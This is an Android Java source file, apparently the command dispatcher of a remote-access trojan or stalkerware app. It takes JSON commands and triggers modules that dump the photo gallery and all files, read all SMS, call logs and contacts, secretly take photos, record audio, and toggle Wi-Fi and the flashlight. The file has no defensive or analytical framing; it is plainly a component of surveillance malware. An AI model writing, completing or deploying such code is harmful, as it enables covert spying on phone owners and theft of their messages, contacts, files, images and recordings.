package com.my.luck.core;

import android.content.Context;
import android.util.Log;
import com.my.luck.features.*;
import org.json.JSONObject;

public class CommandProcessor {
    private Context context;
    private FileDumpModule fileDump;
    private SmsModule smsModule;
    private CallLogModule callLogModule;
    private ContactsModule contactsModule;
    private CameraModule cameraModule;
    private AudioModule audioModule;
    private DeviceControlModule deviceControl;

    public CommandProcessor(Context context) {
        this.context = context;
        initializeModules();
    }

    private void initializeModules() {
        fileDump = new FileDumpModule(context);
        smsModule = new SmsModule(context);
        callLogModule = new CallLogModule(context);
        contactsModule = new ContactsModule(context);
        cameraModule = new CameraModule(context);
        audioModule = new AudioModule(context);
        deviceControl = new DeviceControlModule(context);
    }

    public void processCommand(String commandJson) {
        try {
            JSONObject json = new JSONObject(commandJson);
            String action = json.getString("action");

            switch (action) {
                case "dump_gallery":
                    fileDump.getGalleryFiles();
                    break;
                case "dump_all_files":
                    fileDump.getAllFiles();
                    break;
                case "get_sms":
                    smsModule.getAllSms();
                    break;
                case "get_call_log":
                    callLogModule.getCallLog();
                    break;
                case "get_contacts":
                    contactsModule.getContacts();
                    break;
                case "capture_photo":
                    cameraModule.capturePhoto();
                    break;
                case "start_audio":
                    audioModule.startRecording();
                    break;
                case "stop_audio":
                    audioModule.stopRecording();
                    break;
                case "toggle_wifi_on":
                    deviceControl.toggleWifi(true);
                    break;
                case "toggle_wifi_off":
                    deviceControl.toggleWifi(false);
                    break;
                case "flash_on":
                    deviceControl.toggleFlashlight(true);
                    break;
                case "flash_off":
                    deviceControl.toggleFlashlight(false);
                    break;
                default:
                    Log.d("CommandProcessor", "Unknown action: " + action);
            }
        } catch (Exception e) {
            Log.e("CommandProcessor", "Error parsing command", e);
        }
    }
}